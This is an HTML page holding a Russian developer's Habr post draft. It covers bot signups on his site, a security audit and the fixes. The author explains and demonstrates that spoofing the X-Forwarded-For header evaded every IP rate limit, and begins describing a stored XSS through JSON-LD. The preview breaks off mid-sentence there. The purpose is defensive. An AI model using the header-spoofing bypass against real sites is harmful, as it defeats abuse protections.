+Пишу я в паре с терминальным ИИ-агентом и не скрываю этого. Это не «нейросеть написала статью»: сюжеты, решения и ошибки тут мои, а разбор кода и вычитка — совместные. Отдельно скажу, что аудит из второй части — прямое следствие такой работы. Пройти свой же проект насквозь руками я бы не осилил: сдулся бы на третьем модуле.
+
+Код проекта на GitHub — github.com/SwairIt/doday
+
+Сам продукт живёт на getdoday.ru. Остальные мои проекты — на all.getdoday.ru.
+
+---
+
+ЧТО Я ИЗ ЭТОГО ВЫНЕС
+
+
+Три вещи, которые, кажется, стоят дороже конкретных патчей.
+
+Защита, которую нельзя проверить, — это не защита. Мой лимит по IP выглядел работающим ровно до того момента, когда я послал сорок запросов с подставным заголовком. Каждое утверждение вида «у нас есть защита от X» стоит проверять руками. Один раз. Сегодня.
+
+Ложноположительный результат хуже отсутствия проверки. История с Google — про это. Эндпоинт отвечал, ошибка выглядела осмысленной, вывод оказался неверным, и заплатил за него пользователь. Проверять надо тот путь, которым пойдут люди, а не соседний.
+
+Иногда закон сильнее архитектуры. Я выкинул половину списка провайдеров не потому, что они плохо работали, а потому что передача данных за границу — это отдельная ответственность. Инженерное решение проиграло юридическому. Это нормально, и с этим стоит смириться раньше, чем позже.
+
+И маленький анонс напоследок. Всё, о чём я рассказал, — про продукты, которые уже работают. Параллельно я делаю проект Persona, и устроен он принципиально иначе, чем всё, что я писал раньше. Об этом будет отдельная статья — надеюсь, скоро.
+
+Спасибо, что дочитали.
+
+Ярослав Боев, getdoday.ru
+</textarea>
+<button onclick="copyPlainText()" style="margin-top: 0.6em; padding: 0.5em 1em; border-radius: 4px; border: 1px solid #1a73e8; background: white; color: #1a73e8; cursor: pointer; font-weight: 600;">📋 Скопировать plain text</button>
+</details>
+
+<details style="margin-top: 1em; background: white; padding: 1em 1.5em; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.04);">
+<summary style="cursor: pointer; font-weight: 600; color: #666;">Предпросмотр всего поста как одной статьи</summary>
+<article class="article" id="article" style="margin-top: 1em;">
+<h1>176 ботов, ИИ на чужом ключе и 334 статьи: как я за четыре месяца превратил todo-лист в продукт и разобрал его по швам</h1>
+<hr />
+<p>Привет, Хабр. Меня зовут Ярослав Боев, в сети — SwairIt.</p>
+<p>Четыре месяца назад я сел писать обычный todo-лист на FastAPI. Сейчас на <code>getdoday.ru</code> живёт планировщик для школьников и студентов, а рядом — ещё несколько продуктов: школьное Q&amp;A, тренажёр билетов ПДД, кабинет для репетиторов. Один монолит, 86 000 строк, 1325 тестов.</p>
+<p>А потом я открыл базу и увидел 238 новых аккаунтов. Из них почту подтвердили 62.</p>
+<p>Остальные 176 были ботами.</p>
+<p>Я полез разбираться, как они прошли мимо защиты. Разобрался. А заодно нашёл двенадцать дыр, к ботам не имевших вообще никакого отношения: хранимый XSS на публичных страницах, чужие задачи, которые отдавались по одному идентификатору, сессию, которую нельзя было погасить даже сменой пароля.</p>
+<p>И одну, из-за которой до сих пор немного стыдно: <strong>все мои лимиты по IP обходились одной строкой в HTTP-заголовке</strong>. Я проверил это на собственном проде — сорок запросов, ноль отказов.</p>
+<p>Дальше — три истории с кодом:</p>
+<ol>
+<li><strong>Боты и безопасность.</strong> Как выглядела атака, почему не сработал ни один из трёх уровней защиты и что показал сплошной аудит.</li>
+<li><strong>ИИ-помощник, который работает на ключе пользователя.</strong> Почему я не стал платить за токены сам, как это устроено — и четыре грабли, включая асинхронный генератор, молча съедавший ответы.</li>
+<li><strong>Семантическое ядро и 334 статьи.</strong> Как выглядит контентный раздел, если строить его как код: один источник правды, автопроверки и ускорение в семнадцать раз.</li>
+</ol>
+<p>Плюс короткий финал про приватность — и про то, что я выкинул из продукта не ради красоты, а потому что так велит закон.</p>
+<p>Начнём с ботов.</p>
+<p><em>Картинка: <code>s-01-blog-index.png</code> — раздел <code>/blog</code> на getdoday.ru, 334 статьи с поиском и категориями.</em></p>
+<hr />
+<h1>Часть 1. Боты, которые прошли сквозь три уровня защиты</h1>
+<h2>Как это выглядело</h2>
+<p>За две недели база выросла на 238 аккаунтов. Почту подтвердили 62. Остальные 176 — боты.</p>
+<p>Домены у них были показательные: <code>yahoo.com</code>, <code>hotmail.com</code>, <code>aol.com</code>, корпоративные ящики из старых утечек. А между ними — <code>sdffsd.sdd</code>, <code>flsdfmsodf.ro</code>, <code>prweorwef.com</code>. Запомните эти три, они ещё пригодятся.</p>
+<p>Сразу скажу: это не была атака на меня лично. Никто не сидел и не подбирал ключи к моему сайту. Это обычный неадресный спам форм — кто-то прогоняет список сайтов и постит во всё, что похоже на регистрацию. Ровно поэтому история и полезная: с таким встречается каждый, кто выкатил форму в интернет.</p>
+<p>Защита у меня, между прочим, была. Целых три уровня:</p>
+<ol>
+<li><strong>Honeypot</strong> — скрытое поле, которое человек не видит, а бот заполняет.</li>
+<li><strong>Ограничение частоты</strong> — пять регистраций в минуту с одного IP.</li>
+<li><strong>Подтверждение почты</strong> — письмо со ссылкой.</li>
+</ol>
+<p>Не сработал ни один. И причины у всех трёх разные, поэтому разберу каждую.</p>
+<h2>Дыра первая: лимит, который обнулялся на каждом деплое</h2>
+<p>Начнём с арифметики. Пять регистраций в минуту — это 300 в час и 7200 в сутки. Уже смешно.</p>
+<p>Но настоящая проблема была не в цифре. Вот как этот лимит был устроен:</p>
+<pre><code class="language-python">_ATTEMPTS: dict[str, deque[float]] = {}
+
+def hit(key: str, *, max_calls: int, per_seconds: float) -&gt; bool:
+    now = monotonic()
+    bucket = _ATTEMPTS.setdefault(key, deque())
+    cutoff = now - per_seconds
+    while bucket and bucket[0] &lt; cutoff:
+        bucket.popleft()
+    if len(bucket) &gt;= max_calls:
+        return False
+    bucket.append(now)
+    return True
+</code></pre>
+<p>Обычный скользящий счётчик в памяти процесса. Написан аккуратно, работает как задумано.</p>
+<p>А теперь деталь, которая всё убивает: <strong>push в master перезапускает сервис</strong>. Автопулл, миграции, рестарт — примерно минута. В хороший день я делаю сорок коммитов.</p>
+<p>То есть счётчик стирался по несколько раз в час. Он не защищал ни от чего. Он просто существовал — как знак «злая собака» на калитке без собаки.</p>
+<p>Позже выяснилась ещё одна деталь: uvicorn стартует с двумя воркерами. У каждого свой словарь в памяти. Значит, фактический лимит был не пять, а десять, и в какой воркер попадёт запрос — как повезёт.</p>
+<p><strong>Мораль:</strong> счётчик в памяти процесса — защита от случайного двойного клика, а не от бота. Если состояние обязано пережить рестарт, оно живёт в базе.</p>
+<h2>Дыра вторая: IP, который подделывается одним заголовком</h2>
+<p>А вот это самое интересное, и нашёл я это случайно. Просто решил проверить, работает ли лимит вообще.</p>
+<p>Сервис стоит за nginx. Чтобы uvicorn видел настоящий адрес клиента, а не адрес прокси, он запускается так:</p>
+<pre><code>--proxy-headers --forwarded-allow-ips='*'
+</code></pre>
+<p>Выглядит безобидно: «доверяй заголовкам от прокси». Логично же?</p>
+<p>Давайте заглянем в исходник самого uvicorn:</p>
+<pre><code class="language-python">def get_trusted_client_host(self, x_forwarded_for: str) -&gt; str:
+    x_forwarded_for_hosts = _parse_raw_hosts(x_forwarded_for)
+    if self.always_trust:
+        return x_forwarded_for_hosts[0]   # самый ЛЕВЫЙ элемент
+</code></pre>
+<p>При <code>--forwarded-allow-ips='*'</code> включается <code>always_trust</code>, и берётся <strong>самый левый</strong> элемент <code>X-Forwarded-For</code>.</p>
+<p>Теперь вспомним, как этот заголовок собирает nginx:</p>
+<pre><code class="language-nginx">proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+</code></pre>
+<p><code>$proxy_add_x_forwarded_for</code> — это «что прислал клиент» плюс настоящий адрес, дописанный <strong>справа</strong>. Клиент прислал <code>X-Forwarded-For: 1.2.3.4</code> — до приложения доедет <code>1.2.3.4, 93.x.x.x</code>, где второй настоящий.</p>
+<p>uvicorn берёт первый. Тот, который написал клиент.</p>
+<p>Я не поверил и пошёл проверять на живом сервере. Сорок запросов на ручку логина, несуществующий адрес, аккаунты не создаются:</p>
+<table>
+<thead>
+<tr>
+<th>Что делаю</th>
+<th>Что получаю</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Шлю фиксированный подставной <code>X-Forwarded-For: 203.0.113.7</code></td>
+<td><strong>429: 20</strong>, 401: 20 — лимит сработал. Но на подставной адрес</td>
+</tr>
+<tr>
+<td>Сразу следом меняю <code>X-Forwarded-For</code> в каждом запросе</td>
+<td><strong>429: 0</strong>, 401: 40 — лимит не сработал ни разу</td>
+</tr>
+</tbody>
+</table>
+<p>Смотрите, в чём соль второй строки. Если бы заголовок игнорировался, вторая фаза унаследовала бы уже забитый счётчик реального адреса и отдала бы 429 на первом же запросе. Она отдала ноль. Сорок раз подряд.</p>
+<p>То есть <strong>любой мой лимит по IP обходился одной строкой</strong>. Регистрация, логин, антифлуд на публичных страницах — всё.</p>
+<p>Чинится в двух местах. На сервере — правильным значением флага:</p>
+<pre><code>--forwarded-allow-ips=127.0.0.1
+</code></pre>
+<p>А в приложении я перестал зависеть от того, как именно запущен uvicorn, и стал брать адрес сам:</p>
+<pre><code class="language-python">def client_ip(request: Request) -&gt; str | None:
+    &quot;&quot;&quot;Настоящий адрес клиента, который нельзя подделать заголовком.
+
+    nginx дописывает реальный адрес СПРАВА ($proxy_add_x_forwarded_for),
+    поэтому берём последний элемент — он проставлен нашим прокси,
+    а не гостем.
+    &quot;&quot;&quot;
+    forwarded = request.headers.get(&quot;x-forwarded-for&quot;)
+    if forwarded:
+        parts = [p.strip() for p in forwarded.split(&quot;,&quot;) if p.strip()]
+        if parts:
+            return parts[-1]
+    return request.client.host if request.client else None
+</code></pre>
+<p>Честно про ограничение: «брать правый» верно ровно для одного прокси. Если перед вами цепочка вроде CDN → nginx, правым окажется адрес первого прокси — не настоящий клиент, но и не подделываемый. Огрубление, а не дыра.</p>
+<p><strong>Мораль:</strong> если приложение принимает решения по IP, оно обязано знать, какому источнику этого IP доверяет. <code>'*'</code> — это не «доверяй прокси». Это «доверяй кому угодно».</p>
+<h2>Дыра третья: подтверждение почты, которое ничего не подтверждало</h2>
+<p>В базе была колонка <code>email_verified_at</code>. Письмо уходило, ссылка работала, дата проставлялась. Всё как у людей.</p>
+<p>Потом я поискал по проекту, где эта колонка проверяется перед доступом к функциям. И не нашёл ни одного места. Зато нашёл в сервисе аутентификации честный комментарий, который сам же когда-то и написал:</p>
+<pre><code class="language-python"># Email verification is &quot;soft&quot;: unverified users may sign in.
+</code></pre>
+<p>То есть бот регистрировался и сразу пользовался аккаунтом. Подтверждение почты было украшением. Красивым, бесполезным.</p>
+<p>Дальше я принял решение, с которым кто-то не согласится: <strong>жёсткую проверку я делать не стал</strong>. Потому что письма теряются. Падают в спам. Приходят на ящик, к которому у школьника нет доступа с телефона. Жёсткий гейт отрезал бы живых людей ради ботов, которых можно поймать дешевле.</p>
+<p>Вместо этого — автоудаление. Аккаунт, у которого разом не подтверждена почта, нет ни одной задачи, нет привязки к Telegram и профиля репетитора, через 30 дней удаляется сам.</p>
+<h2>Что я поставил вместо</h2>
+<p>Три меры. Ни одна не требует JavaScript — бот его не исполняет, а живой браузер проходит проверки и не замечает.</p>
+<p><strong>1. Подписанная метка времени формы.</strong> Кладём в форму время, когда её отрисовали. Обязательно подписанное — иначе бот просто подставит «пять секунд назад» и будет проходить всегда:</p>
+<pre><code class="language-python">def issue_form_token() -&gt; str:
+    ts = f&quot;{datetime.now(UTC).timestamp():.0f}&quot;
+    return f&quot;{ts}.{_sign(ts)}&quot;
+
+def _sign(ts: str) -&gt; str:
+    secret = get_settings().app_secret_key.encode()
+    return hmac.new(secret, f&quot;register:{ts}&quot;.encode(), hashlib.sha256).hexdigest()[:32]
+
+def check_form_timing(token: str | None) -&gt; None:
+    stale = &quot;Форма устарела, обнови страницу.&quot;
+    if not token or &quot;.&quot; not in token:
+        raise SignupRejected(stale, log_code=&quot;no_timestamp&quot;)
+
+    ts, _, signature = token.partition(&quot;.&quot;)
+    if not hmac.compare_digest(signature, _sign(ts)):
+        raise SignupRejected(stale, log_code=&quot;bad_signature&quot;)
+
+    elapsed = datetime.now(UTC).timestamp() - float(ts)
+    if elapsed &lt; MIN_FORM_SECONDS:
+        raise SignupRejected(&quot;Слишком быстро — заполни форму ещё раз.&quot;, log_code=&quot;too_fast&quot;)
+    if elapsed &gt; MAX_FORM_SECONDS:
+        raise SignupRejected(stale, log_code=&quot;expired&quot;)
+</code></pre>
+<p>Это убивает весь класс «прямой POST по списку URL». Бот либо не пришлёт метку вовсе, либо пришлёт свою — и подпись не сойдётся.</p>
+<p><strong>2. Счёт регистраций по базе, а не в памяти.</strong> У пользователя появились две колонки: <code>signup_ip</code> и <code>signup_subnet</code> — первые три октета. Подсеть здесь важнее адреса: поменять последний октет не стоит ничего.</p>
+<pre><code class="language-python">MAX_PER_IP_HOUR = 5
+MAX_PER_SUBNET_HOUR = 30
+</code></pre>
+<p>Запас нарочно щедрый, и вот почему. Моя аудитория сидит за школьным NAT и за CGNAT мобильных операторов, где сотню человек видно как один адрес. Cloudflare публиковал измерение: CGNAT-адреса попадают под ограничения втрое чаще, при этом ботов среди них <em>меньше</em>. Урок информатики, на котором класс регистрируется одновременно, не должен упереться в мой лимит — иначе я решу проблему ботов ценой живых пользователей.</p>
+<p>И отдельная защита от себя же. Если приложение видит внутренний адрес — <code>127.0.0.1</code> или что-то из приватных диапазонов, — значит прокси не проставил заголовок и настоящий клиент нам просто неизвестен. Считать всех одним человеком в такой ситуации нельзя: регистрация закроется всему сайту после пятой за час.</p>
+<pre><code class="language-python">if not ip or _is_internal(ip):
+    return
+</code></pre>
+<p><strong>3. Проверка, существует ли домен почты.</strong> Вот тут меня ждал сюрприз.</p>
+<p>Я собрался прикручивать списки одноразовых почт — классика жанра. Полез сверять со своими данными и обнаружил, что против моих ботов они бесполезны: ни один из наблюдавшихся доменов не был temp-mail.</p>
+<p>Зато помните <code>sdffsd.sdd</code>, <code>flsdfmsodf.ro</code> и <code>prweorwef.com</code>? Это NXDOMAIN. Ни MX, ни A-записи. Письмо туда физически не уйдёт — домена не существует.</p>
+<p>Одна DNS-проверка выносит их целиком:</p>
+<pre><code class="language-python">def _probe_domain(domain: str) -&gt; bool:
+    from email_validator import EmailUndeliverableError, validate_email
+
+    try:
+        validate_email(f&quot;probe@{domain}&quot;, check_deliverability=True, timeout=3)
+    except EmailUndeliverableError:
+        return False
+    except Exception:
+        # Таймаут, сбой резолвера — пропускаем. Отказать живому человеку
+        # из-за нашей же сетевой проблемы хуже, чем пропустить бота.
+        return True
+    return True
+
+_domain_has_mail = lru_cache(maxsize=4096)(_probe_domain)
+</code></pre>
+<p>Резолвер синхронный, поэтому в приложении он уезжает в отдельный поток: регистрация — не то место, где стоит блокировать event loop на секунду.</p>
+<p>Чего я делать <strong>не стал</strong> и вам не советую: отсекать адреса по признаку «много цифр подряд». У меня полно живых пользователей, у которых вместо имени ящика телефон — <code>79161234567@mail.ru</code>. Правило, которое ловит ботов вместе с людьми, хуже, чем отсутствие правила.</p>
+<h2>И сигнализация</h2>
+<p>Те 176 ботов я заметил постфактум, разбирая базу руками. Это, если честно, обиднее всего остального.</p>
+<p>Теперь при каждой регистрации считается число аккаунтов за последний час, и если оно переваливает за двадцать — мне приходит письмо. Повторное не чаще раза в час, все ошибки внутри глушатся: сигнализация не имеет права уронить регистрацию.</p>
+<p>Самая дешёвая мера из всех и самая недооценённая. Защиту рано или поздно обойдут. А вот незамеченной волна оставаться не должна.</p>
+<hr />
+<h1>Часть 2. Аудит: двенадцать дыр, к ботам отношения не имевших</h1>
+<p>Раз уж я всё равно копался в безопасности, то прошёл проект целиком: авторизация, права доступа, платежи, хранение секретов, XSS, SSRF. Ниже — то, что стоило починить, с объяснением механики. Всё закрыто тестами.</p>
+<h2>Хранимый XSS через JSON-LD</h2>
+<p>Моя любимая находка. Красивая, как в учебнике.</p>
+<p>На публичных страницах школьного Q&amp;A стоит разметка для поисковиков:</p>
+<pre><code class="language-python">&quot;jsonld&quot;: json.dumps(jsonld, ensure_ascii=False),
+</code></pre>
+<pre><code class="language-html">&lt;script type=&quot;application/ld+json&quot;&gt;{{ jsonld | safe }}&lt;/script&gt;
+</code></pre>
+<p>Выглядит безопасно, правда? <code>json.dumps</code> экранирует кавычки и слэши, вырваться из строки нельзя.</p>
+<p>Только HTML-парсер про JSON ничего не знает. Он закрывает <code>&lt;script&gt;</code> на первой же последовательности `</p>
+</article>
+</details>
+
+<script>
+async function copyPost() {
+  const article = document.getElementById("article");
+  const html = article.innerHTML;
+  const text = article.innerText;
+  const btn = document.getElementById("copy-btn");
+  try {
+    if (navigator.clipboard && window.ClipboardItem) {
+      await navigator.clipboard.write([
+        new ClipboardItem({
+          "text/html": new Blob([html], { type: "text/html" }),
+          "text/plain": new Blob([text], { type: "text/plain" }),
+        })
+      ]);
+    } else {
+      const range = document.createRange();
+      range.selectNode(article);
+      const sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      document.execCommand("copy");
+      sel.removeAllRanges();
+    }
+    btn.textContent = "✓ Скопировано! Теперь вставь в редактор";
+    btn.classList.add("ok");
+    setTimeout(() => { btn.textContent = "📋 Скопировать пост"; btn.classList.remove("ok"); }, 3000);
+  } catch (e) {
+    alert("Не получилось скопировать автоматически. Выдели текст в белом блоке через Ctrl+A и скопируй Ctrl+C. Ошибка: " + e.message);
+  }
+}
+
+async function copySection(sectionId, btn) {
+  const el = document.getElementById(sectionId);
+  if (!el) return;
+  const html = el.innerHTML;
+  const text = el.innerText;
+  try {
+    if (navigator.clipboard && window.ClipboardItem) {
+      await navigator.clipboard.write([
+        new ClipboardItem({
+          "text/html": new Blob([html], { type: "text/html" }),
+          "text/plain": new Blob([text], { type: "text/plain" }),
+        })
+      ]);
+    } else {
+      const range = document.createRange();
+      range.selectNode(el);
+      const sel = window.getSelection();
+      sel.removeAllRanges();
+      sel.addRange(range);
+      document.execCommand("copy");
+      sel.removeAllRanges();
+    }
+    const origText = btn.textContent;
+    btn.textContent = "✓ Готово";
+    btn.classList.add("ok");
+    setTimeout(() => { btn.textContent = origText; btn.classList.remove("ok"); }, 2500);
+  } catch (e) {
+    alert("Не получилось. Выдели текст руками через Ctrl+A в блоке выше. Ошибка: " + e.message);
+  }
+}
+
+async function copyPlainText() {
+  const ta = document.getElementById("plain-textarea");
+  ta.select();
+  try {
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+      await navigator.clipboard.writeText(ta.value);
+    } else {
+      document.execCommand("copy");
+    }
+    alert("Plain text скопирован в буфер. Вставь в редактор Хабр.");
+  } catch (e) {
+    alert("Не получилось. Ошибка: " + e.message);
+  }
+}
+</script>
+</body></html>
